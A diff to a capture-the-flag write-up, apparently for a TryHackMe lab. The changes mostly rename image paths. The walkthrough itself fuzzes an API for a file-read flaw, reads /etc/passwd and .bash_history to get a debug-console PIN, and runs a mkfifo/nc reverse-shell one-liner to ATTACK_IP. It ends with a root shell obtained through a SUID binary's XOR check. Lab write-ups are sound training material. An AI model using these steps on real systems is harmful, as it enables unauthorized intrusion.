@@ -53,27 +53,27 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 After accessing the web page in port 80 I found :
 
-![!\[\[Pasted image 20230806140146.png\]\]](<../../../assets/images/HTBPics/Pasted image 20230806140146.png>)
+![Alt text](<../../../assets/images/THMPics/Pasted image 20230806140146.png>)
 
 And port 5000 contains the following page :
 
-![!\[\[Pasted image 20230806140127.png\]\]](<../../../assets/images/HTBPics/Pasted image 20230806140127.png>)
+![Alt text](<../../../assets/images/THMPics/Pasted image 20230806140127.png>)
 
-![!\[\[Pasted image 20230806140218.png\]\]](<../../../assets/images/HTBPics/Pasted image 20230806140218.png>)
+![Alt text](<../../../assets/images/THMPics/Pasted image 20230806140218.png>)
 
 The /api endpoint found in robots.txt gives us information how to use the request to the api :
 
-![!\[\[Pasted image 20230806140255.png\]\]](<../../../assets/images/HTBPics/Pasted image 20230806140255.png>)
+![Alt text](<../../../assets/images/THMPics/Pasted image 20230806140255.png>)
 
 In the source code I found an interesting hint for LFI :
 
-![!\[\[Pasted image 20230806142124.png\]\]](<../../../assets/images/HTBPics/Pasted image 20230806142124.png>)
+![Alt text](<../../../assets/images/THMPics/Pasted image 20230806142124.png>)
 
 Also in the source code of main.js I found another hint, so it may be an indication that there is a version 1 :
 
-![!\[\[Pasted image 20230806141934.png\]\]](<../../../assets/images/HTBPics/Pasted image 20230806141934.png>)
+![Alt text](<../../../assets/images/THMPics/Pasted image 20230806141934.png>)
 
-![!\[\[Pasted image 20230806142329.png\]\]](<../../../assets/images/HTBPics/Pasted image 20230806142329.png>)
+![Alt text](<../../../assets/images/THMPics/Pasted image 20230806142329.png>)
 
 So there is actually a v1! Now, let’s fuzz the API (v1) to find a possible parameter that would allow to read arbitrary files :
 
@@ -81,29 +81,29 @@ So there is actually a v1! Now, let’s fuzz the API (v1) to find a possible par
 wfuzz -w /usr/share/wordlists/dirb/common.txt --hc=404 "http://10.10.255.130:5000/api/v1/resources/books?FUZZ=/etc/passwd"
 ```
 
-![!\[\[Pasted image 20230806143110.png\]\]](<../../../assets/images/HTBPics/Pasted image 20230806143110.png>)
+![Alt text](<../../../assets/images/THMPics/Pasted image 20230806143110.png>)
 
 Found the vulnerable parameter! Now let's read /etc/passwd file :
 
-![!\[\[Pasted image 20230806143244.png\]\]](<../../../assets/images/HTBPics/Pasted image 20230806143244.png>)
+![Alt text](<../../../assets/images/THMPics/Pasted image 20230806143244.png>)
 
 Referring to the hint found let's read the user flag :
 
-![!\[\[Pasted image 20230806141934.png\]\]](<../../../assets/images/HTBPics/Pasted image 20230806141934.png>)
+![Alt text](<../../../assets/images/THMPics/Pasted image 20230806141934.png>)
 
-![!\[\[Pasted image 20230806143609.png\]\]](<../../../assets/images/HTBPics/Pasted image 20230806143609.png>)
+![Alt text](<../../../assets/images/THMPics/Pasted image 20230806143609.png>)
 
 Using **Gobuster** we can see the */console* endpoint :
 
-![!\[\[Pasted image 20230806143805.png\]\]](<../../../assets/images/HTBPics/Pasted image 20230806143805.png>)
+![Alt text](<../../../assets/images/THMPics/Pasted image 20230806143805.png>)
 
 Now let's read the .bash_history file as mentioned in the hint to find the PIN for /console :
 
-![!\[\[Pasted image 20230806143531.png\]\]](<../../../assets/images/HTBPics/Pasted image 20230806143531.png>)
+![Alt text](<../../../assets/images/THMPics/Pasted image 20230806143531.png>)
 
 PIN : 123-321-135
 
-![!\[\[Pasted image 20230806143932.png\]\]](<../../../assets/images/HTBPics/Pasted image 20230806143932.png>)
+![Alt text](<../../../assets/images/THMPics/Pasted image 20230806143932.png>)
 
 The bellow blog from **HackTricks** show us how to exploit that :
 
@@ -115,9 +115,9 @@ Now let's get a revshell :
 __import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACK_IP 9999 >/tmp/f').read();
 ```
 
-![Alt text](<../../../assets/images/HTBPics/Pasted image 20230806144510.png>)
+![Alt text](<../../../assets/images/THMPics/Pasted image 20230806144510.png>)
 
-![!\[\[Pasted image 20230806144343.png\]\]](<../../../assets/images/HTBPics/Pasted image 20230806144343.png>)
+![Alt text](<../../../assets/images/THMPics/Pasted image 20230806144343.png>)
 
 I am in as sid user!
 
@@ -125,17 +125,17 @@ I am in as sid user!
 
 I found an interesting file with the SUID bit set :
 
-![!\[\[Pasted image 20230806145653.png\]\]](<../../../assets/images/HTBPics/Pasted image 20230806145653.png>)
+![Alt text](<../../../assets/images/THMPics/Pasted image 20230806145653.png>)
 
 I downloaded a copy of the binary and analyzed it in Ghidra. Below is the main() function :
 
-![!\[\[Pasted image 20230806145620.png\]\]](<../../../assets/images/HTBPics/Pasted image 20230806145620.png>)
+![Alt text](<../../../assets/images/THMPics/Pasted image 20230806145620.png>)
 
 The program prompts for a number (local_1c), XORs it with `0x1116` and `0x5db3` (local_18) and compares the result with `0x5dcd21f4`. If they match, a root shell will be spawned.
 
 Let’s do the reverse operation to get the correct value that will give us the ability to spawn a root shell:
 
-![!\[\[Pasted image 20230806150722.png\]\]](<../../../assets/images/HTBPics/Pasted image 20230806150722.png>)
+![Alt text](<../../../assets/images/THMPics/Pasted image 20230806150722.png>)
 
 # Root flag
 
